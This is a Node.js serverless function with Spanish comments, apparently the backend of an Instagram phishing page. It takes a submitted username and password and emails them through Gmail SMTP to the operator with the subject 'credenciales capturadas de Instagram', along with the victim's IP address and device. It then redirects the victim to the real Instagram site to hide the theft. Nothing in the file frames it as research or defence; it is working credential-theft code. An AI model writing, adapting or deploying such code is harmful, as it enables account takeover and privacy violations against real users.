require('dotenv').config();
const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  // Añadir headers CORS
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json'
  };

  // Manejar preflight OPTIONS request
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Método no permitido' })
    };
  }

  try {
    const { username, password } = JSON.parse(event.body);
    
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      throw new Error('Configuración de email incompleta');
    }

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    // Verificar conexión SMTP
    await transporter.verify();

    const mailOptions = {
      from: `"Captura de Credenciales" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: '🎣 Nuevas credenciales capturadas de Instagram',
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f9f9f9;">
          <h2 style="color: #333;">✅ Credenciales Capturadas</h2>
          <div style="background-color: white; padding: 20px; border-radius: 5px; margin: 20px 0; border: 1px solid #eee;">
            <p><strong>📧 Usuario/Email:</strong> ${username}</p>
            <p><strong>🔑 Contraseña:</strong> ${password}</p>
            <p><strong>⏰ Fecha y Hora:</strong> ${new Date().toLocaleString()}</p>
            <p><strong>🌐 IP:</strong> ${event.headers['client-ip'] || 'Desconocida'}</p>
            <p><strong>📱 Dispositivo:</strong> ${event.headers['user-agent'] || 'Desconocido'}</p>
          </div>
        </div>
      `
    };

    const info = await transporter.sendMail(mailOptions);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        messageId: info.messageId,
        redirectTo: 'https://www.instagram.com'
      })
    };

  } catch (error) {
    console.error('Error:', error);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        success: false,
        error: error.message
      })
    };
  }
}; 